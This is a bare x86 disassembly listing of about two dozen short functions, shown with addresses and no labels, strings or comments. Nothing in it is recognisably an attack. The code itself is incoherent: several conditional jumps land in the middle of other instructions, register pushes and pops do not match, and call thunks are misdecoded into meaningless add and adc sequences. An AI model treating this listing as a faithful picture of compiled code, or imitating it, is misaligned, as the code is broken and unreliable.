  4d10c1:	xor    DWORD PTR [ecx-0x144],0xffffbd16
  4d10cb:	push   ecx
  4d10cc:	call   0x4d084c
  4d10d1:	add    esp,0x4
  4d10d4:	pop    ecx
  4d10d5:	push   ecx
  4d10d6:	push   DWORD PTR [ecx+0x18]
  4d10d9:	push   DWORD PTR [ecx+0xcc]
  4d10df:	push   ebx
  4d10e0:	push   DWORD PTR [ecx+0x94]
  4d10e6:	call   0x4d0dc4
  4d10eb:	add    esp,0x10
  4d10ee:	pop    ecx
  4d10ef:	push   ecx
  4d10f0:	mov    eax,0x0
  4d10f5:	push   eax
  4d10f6:	call   0x4d0e14
  4d10fb:	add    esp,0x4
  4d10fe:	pop    ecx
  4d10ff:	add    esp,0x30
  4d1102:	pop    ebp
  4d1103:	ret    
  4d1104:	mov    edi,edi
  4d1106:	push   ebp
  4d1107:	mov    ebp,esp
  4d1109:	sub    esp,0x60
  4d110c:	lea    ecx,ds:0x4d3084
  4d1112:	mov    eax,0xfffffff3
  4d1117:	push   ecx
  4d1118:	push   edx
  4d1119:	push   edx
  4d111a:	call   0x4d0d2c
  4d111f:	add    esp,0x8
  4d1122:	pop    ecx
  4d1123:	push   ecx
  4d1124:	push   0x0
  4d1126:	call   0x4d0d20
  4d112b:	add    esp,0x4
  4d112e:	pop    ecx
  4d112f:	push   ecx
  4d1130:	call   0x4d084c
  4d1135:	add    esp,0x4
  4d1138:	pop    ecx
  4d1139:	add    esp,0x60
  4d113c:	pop    ebp
  4d113d:	ret    
  4d113e:	add    BYTE PTR [eax],al
  4d1140:	pop    edi
  4d1141:	call   DWORD PTR ds:0x4d2064
  4d1147:	call   edi
  4d1149:	add    BYTE PTR [eax],al
  4d114b:	add    BYTE PTR [edi-0x1],bl
  4d114e:	adc    eax,0x4d2038
  4d1153:	call   edi
  4d1155:	add    BYTE PTR [eax],al
  4d1157:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d115d:	sub    esp,0x34
  4d1160:	lea    ecx,[esi+0x88]
  4d1166:	mov    edi,DWORD PTR [ebp-0x14]
  4d1169:	push   ecx
  4d116a:	call   0x4d0d14
  4d116f:	add    esp,0x4
  4d1172:	pop    ecx
  4d1173:	push   ecx
  4d1174:	push   DWORD PTR [ecx+0xc0]
  4d117a:	push   DWORD PTR [ecx+0x20]
  4d117d:	push   esi
  4d117e:	push   DWORD PTR [ecx+0x4c]
  4d1181:	call   0x4d0f9c
  4d1186:	add    esp,0x10
  4d1189:	pop    ecx
  4d118a:	push   ecx
  4d118b:	push   0x0
  4d118d:	call   0x4d12e8
  4d1192:	add    esp,0x4
  4d1195:	pop    ecx
  4d1196:	add    esp,0x34
  4d1199:	pop    ebp
  4d119a:	ret    
  4d119b:	add    BYTE PTR [edi-0x1],bl
  4d119e:	adc    eax,0x4d2074
  4d11a3:	call   edi
  4d11a5:	add    BYTE PTR [eax],al
  4d11a7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d11ad:	sub    esp,0x60
  4d11b0:	mov    ebx,0x4d308c
  4d11b5:	sub    DWORD PTR [ebx+0x80],edi
  4d11bb:	push   ebx
  4d11bc:	push   esi
  4d11bd:	push   DWORD PTR [ebx+0xdc]
  4d11c3:	call   0x4d0bcc
  4d11c8:	add    esp,0x8
  4d11cb:	pop    ebx
  4d11cc:	lea    ecx,[ebx-0x8c]
  4d11d2:	push   ecx
  4d11d3:	call   0x4d0fe0
  4d11d8:	add    esp,0x4
  4d11db:	test   eax,eax
  4d11dd:	jne    0x4d11cd
  4d11df:	push   0x0
  4d11e1:	call   0x4d12e8
  4d11e6:	add    esp,0x4
  4d11e9:	add    esp,0x60
  4d11ec:	pop    ebp
  4d11ed:	ret    
  4d11ee:	add    BYTE PTR [eax],al
  4d11f0:	mov    edi,edi
  4d11f2:	push   ebp
  4d11f3:	mov    ebp,esp
  4d11f5:	sub    esp,0x54
  4d11f8:	lea    eax,[esi-0x140]
  4d11fe:	or     edi,DWORD PTR [ebp-0x10]
  4d1201:	push   eax
  4d1202:	push   DWORD PTR [eax+0x120]
  4d1208:	push   DWORD PTR [eax+0x5c]
  4d120b:	push   edi
  4d120c:	call   0x4d11a8
  4d1211:	add    esp,0xc
  4d1214:	pop    eax
  4d1215:	push   eax
  4d1216:	mov    eax,0x0
  4d121b:	push   eax
  4d121c:	call   0x4d12e8
  4d1221:	add    esp,0x4
  4d1224:	pop    eax
  4d1225:	push   eax
  4d1226:	push   0x0
  4d1228:	call   0x4d0f48
  4d122d:	add    esp,0x4
  4d1230:	pop    eax
  4d1231:	add    esp,0x54
  4d1234:	pop    ebp
  4d1235:	ret    
  4d1236:	add    BYTE PTR [eax],al
  4d1238:	mov    edi,edi
  4d123a:	push   ebp
  4d123b:	mov    ebp,esp
  4d123d:	sub    esp,0x40
  4d1240:	lea    eax,[edi-0xd0]
  4d1246:	and    DWORD PTR [ebp-0x10],edi
  4d1249:	push   eax
  4d124a:	push   edx
  4d124b:	push   DWORD PTR [eax+0x60]
  4d124e:	push   ecx
  4d124f:	push   DWORD PTR [eax+0x164]
  4d1255:	call   0x4d1104
  4d125a:	add    esp,0x10
  4d125d:	pop    eax
  4d125e:	push   eax
  4d125f:	call   0x4d0d14
  4d1264:	add    esp,0x4
  4d1267:	pop    eax
  4d1268:	push   eax
  4d1269:	push   0xfffffff4
  4d126b:	call   0x4d0b2c
  4d1270:	add    esp,0x4
  4d1273:	pop    eax
  4d1274:	add    esp,0x40
  4d1277:	pop    ebp
  4d1278:	ret    
  4d1279:	add    BYTE PTR [eax],al
  4d127b:	add    BYTE PTR [edi-0x1],bl
  4d127e:	adc    eax,0x4d2080
  4d1283:	call   edi
  4d1285:	add    BYTE PTR [eax],al
  4d1287:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d128d:	sub    esp,0x48
  4d1290:	lea    ebx,[ecx+0x50]
  4d1293:	sub    esi,edi
  4d1295:	push   0x0
  4d1297:	call   0x4d0858
  4d129c:	add    esp,0x4
  4d129f:	push   ebx
  4d12a0:	push   edx
  4d12a1:	push   DWORD PTR [ebx+0x128]
  4d12a7:	push   DWORD PTR [ebx+0x1f8]
  4d12ad:	push   esi
  4d12ae:	call   0x4d1034
  4d12b3:	add    esp,0x10
  4d12b6:	pop    ebx
  4d12b7:	call   0x4d0c68
  4d12bc:	add    esp,0x4
  4d12bf:	add    esp,0x48
  4d12c2:	pop    ebp
  4d12c3:	ret    
  4d12c4:	pop    edi
  4d12c5:	call   DWORD PTR ds:0x4d2044
  4d12cb:	call   edi
  4d12cd:	add    BYTE PTR [eax],al
  4d12cf:	add    BYTE PTR [edi-0x1],bl
  4d12d2:	adc    eax,0x4d208c
  4d12d7:	call   edi
  4d12d9:	add    BYTE PTR [eax],al
  4d12db:	add    BYTE PTR [edi-0x1],bl
  4d12de:	adc    eax,0x4d204c
  4d12e3:	call   edi
  4d12e5:	add    BYTE PTR [eax],al
  4d12e7:	add    BYTE PTR [edi-0x1],bl
  4d12ea:	adc    eax,0x4d200c
  4d12ef:	call   edi
  4d12f1:	add    BYTE PTR [eax],al
  4d12f3:	add    BYTE PTR [edi-0x1],bl
  4d12f6:	adc    eax,0x4d2014
  4d12fb:	call   edi
  4d12fd:	add    BYTE PTR [eax],al
  4d12ff:	add    BYTE PTR [edi-0x1],bl
  4d1302:	adc    eax,0x4d2040
  4d1307:	call   edi
  4d1309:	add    BYTE PTR [eax],al
  4d130b:	add    BYTE PTR [edi-0x1],bl
  4d130e:	adc    eax,0x4d2098
  4d1313:	call   edi
  4d1315:	add    BYTE PTR [eax],al
  4d1317:	add    BYTE PTR [edi-0x1],bl
  4d131a:	adc    eax,0x4d203c
  4d131f:	call   edi
  4d1321:	add    BYTE PTR [eax],al
  4d1323:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1329:	sub    esp,0x34
  4d132c:	mov    ebx,0x4d3088
  4d1331:	sub    DWORD PTR [ebp-0x2c],ecx
  4d1334:	push   0x0
  4d1336:	call   0x4d08c8
  4d133b:	add    esp,0x4
  4d133e:	push   ebx
  4d133f:	push   edx
  4d1340:	push   DWORD PTR [ebx+0x2c]
  4d1343:	push   edx
  4d1344:	push   ecx
  4d1345:	call   0x4d0778
  4d134a:	add    esp,0x10
  4d134d:	pop    ebx
  4d134e:	mov    edi,0x0
  4d1353:	push   edi
  4d1354:	call   0x4d08c8
  4d1359:	add    esp,0x4
  4d135c:	add    esp,0x34
  4d135f:	pop    ebp
  4d1360:	ret    
  4d1361:	add    BYTE PTR [eax],al
  4d1363:	add    BYTE PTR [edi-0x1],bl
  4d1366:	adc    eax,0x4d2078
  4d136b:	call   edi
  4d136d:	add    BYTE PTR [eax],al
  4d136f:	add    BYTE PTR [edi-0x1],bl
  4d1372:	adc    eax,0x4d2084
  4d1377:	call   edi
  4d1379:	add    BYTE PTR [eax],al
  4d137b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1381:	sub    esp,0x44
  4d1384:	mov    edi,0x4d30dc
  4d1389:	xor    DWORD PTR [edi+0x74],0xf8b
  4d1390:	push   edi
  4d1391:	push   0x0
  4d1393:	call   0x4d0858
  4d1398:	add    esp,0x4
  4d139b:	pop    edi
  4d139c:	push   edi
  4d139d:	push   DWORD PTR [edi+0x1b0]
  4d13a3:	push   ebx
  4d13a4:	push   ebx
  4d13a5:	push   DWORD PTR [edi+0x94]
  4d13ab:	call   0x4d096c
  4d13b0:	add    esp,0x10
  4d13b3:	pop    edi
  4d13b4:	push   edi
  4d13b5:	mov    ebx,0x0
  4d13ba:	push   ebx
  4d13bb:	call   0x4d12f4
  4d13c0:	add    esp,0x4
  4d13c3:	pop    edi
  4d13c4:	add    esp,0x44
  4d13c7:	pop    ebp
  4d13c8:	ret    
  4d13c9:	add    BYTE PTR [eax],al
  4d13cb:	add    BYTE PTR [edi-0x1],bl
  4d13ce:	adc    eax,0x4d2094
  4d13d3:	call   edi
  4d13d5:	add    BYTE PTR [eax],al
  4d13d7:	add    BYTE PTR [edi-0x1],bl
  4d13da:	adc    eax,0x4d2070
  4d13df:	call   edi
  4d13e1:	add    BYTE PTR [eax],al
  4d13e3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d13e9:	sub    esp,0x5c
  4d13ec:	mov    ebx,0x4d3164
  4d13f1:	add    DWORD PTR [ebx-0x114],esi
  4d13f7:	push   ebx
  4d13f8:	push   eax
  4d13f9:	push   ecx
  4d13fa:	call   0x4d0b44
  4d13ff:	add    esp,0x8
  4d1402:	pop    ebx
  4d1403:	call   0x4d0d14
  4d1408:	add    esp,0x4
  4d140b:	call   0x4d0c68
  4d1410:	add    esp,0x4
  4d1413:	add    esp,0x5c
  4d1416:	pop    ebp
  4d1417:	ret    
  4d1418:	mov    edi,edi
  4d141a:	push   ebp
  4d141b:	mov    ebp,esp
  4d141d:	sub    esp,0x44
  4d1420:	lea    edx,[edi+0x9c]
  4d1426:	sub    eax,0xffffffad
  4d1429:	push   edx
  4d142a:	mov    esi,0x0
  4d142f:	push   esi
  4d1430:	call   0x4d08c8
  4d1435:	add    esp,0x4
  4d1438:	pop    edx
  4d1439:	push   edx
  4d143a:	push   DWORD PTR [edx+0x10c]
  4d1440:	push   DWORD PTR [edx+0xc4]
  4d1446:	push   DWORD PTR [edx+0x160]
  4d144c:	push   DWORD PTR [edx+0x128]
  4d1452:	call   0x4d0c74
  4d1457:	add    esp,0x10
  4d145a:	pop    edx
  4d145b:	push   edx
  4d145c:	mov    esi,0x0
  4d1461:	push   esi
  4d1462:	call   0x4d0f48
  4d1467:	add    esp,0x4
  4d146a:	pop    edx
  4d146b:	add    esp,0x44
  4d146e:	pop    ebp
  4d146f:	ret    
  4d1470:	mov    edi,edi
  4d1472:	push   ebp
  4d1473:	mov    ebp,esp
  4d1475:	sub    esp,0x5c
  4d1478:	lea    esi,[edi+0x180]
  4d147e:	add    DWORD PTR [esi+0x20],0x65d0
  4d1485:	mov    edx,0x0
  4d148a:	push   edx
  4d148b:	call   0x4d0858
  4d1490:	add    esp,0x4
  4d1493:	push   esi
  4d1494:	push   DWORD PTR [esi+0x20]
  4d1497:	push   edi
  4d1498:	push   ebx
  4d1499:	call   0x4d10b4
  4d149e:	add    esp,0xc
  4d14a1:	pop    esi
  4d14a2:	mov    edx,0x0
  4d14a7:	push   edx
  4d14a8:	call   0x4d12e8
  4d14ad:	add    esp,0x4
  4d14b0:	add    esp,0x5c
  4d14b3:	pop    ebp
  4d14b4:	ret    
  4d14b5:	add    BYTE PTR [eax],al
  4d14b7:	add    BYTE PTR [edi-0x1],bl
  4d14ba:	adc    eax,0x4d2054
  4d14bf:	call   edi
  4d14c1:	add    BYTE PTR [eax],al
  4d14c3:	add    BYTE PTR [edi-0x1],bl
  4d14c6:	adc    eax,0x4d2048
  4d14cb:	call   edi
  4d14cd:	add    BYTE PTR [eax],al
  4d14cf:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d14d5:	sub    esp,0x20
  4d14d8:	mov    ebx,0x4d31b4
  4d14dd:	adc    eax,DWORD PTR [ebx+0xc]
  4d14e0:	lea    edx,[ebx-0x1b4]
  4d14e6:	push   edx
  4d14e7:	call   0x4d0fe0
  4d14ec:	add    esp,0x4
  4d14ef:	test   eax,eax
  4d14f1:	jne    0x4d14e1
  4d14f3:	push   ebx
  4d14f4:	push   DWORD PTR [ebx+0xb4]
  4d14fa:	push   DWORD PTR [ebx+0x11c]
  4d1500:	call   0x4d0b88
  4d1505:	add    esp,0x8
  4d1508:	pop    ebx
  4d1509:	push   0x0
  4d150b:	call   0x4d0e14
  4d1510:	add    esp,0x4
  4d1513:	add    esp,0x20
  4d1516:	pop    ebp
  4d1517:	ret    
  4d1518:	pop    edi
  4d1519:	call   DWORD PTR ds:0x4d20a0
  4d151f:	call   edi
  4d1521:	add    BYTE PTR [eax],al
  4d1523:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1529:	sub    esp,0x30
  4d152c:	lea    esi,ds:0x4d31e4
  4d1532:	cmp    esi,0x6deb
  4d1538:	jbe    0x4d1527
  4d153a:	call   0x4d0c68
  4d153f:	add    esp,0x4
  4d1542:	push   esi
  4d1543:	push   edx
  4d1544:	push   ecx
  4d1545:	call   0x4d08e0
  4d154a:	add    esp,0x8
  4d154d:	pop    esi
  4d154e:	mov    edi,0x0
  4d1553:	push   edi
  4d1554:	call   0x4d0a90
  4d1559:	add    esp,0x4
  4d155c:	add    esp,0x30
  4d155f:	pop    ebp
  4d1560:	ret    
  4d1561:	add    BYTE PTR [eax],al
  4d1563:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1569:	sub    esp,0x30
  4d156c:	lea    ebx,ds:0x4d3034
  4d1572:	mov    edx,DWORD PTR [ebp-0x18]
  4d1575:	lea    esi,[ebx-0x34]
  4d1578:	push   esi
  4d1579:	call   0x4d0fe0
  4d157e:	add    esp,0x4
  4d1581:	test   eax,eax
  4d1583:	jne    0x4d1576
  4d1585:	push   ebx
  4d1586:	push   esi
  4d1587:	push   DWORD PTR [ebx+0x180]
  4d158d:	push   ecx
  4d158e:	push   edi
  4d158f:	call   0x4d1524
  4d1594:	add    esp,0x10
  4d1597:	pop    ebx
  4d1598:	mov    edi,0x0
  4d159d:	push   edi
  4d159e:	call   0x4d0e14
  4d15a3:	add    esp,0x4
  4d15a6:	add    esp,0x30
  4d15a9:	pop    ebp
  4d15aa:	ret    
	...
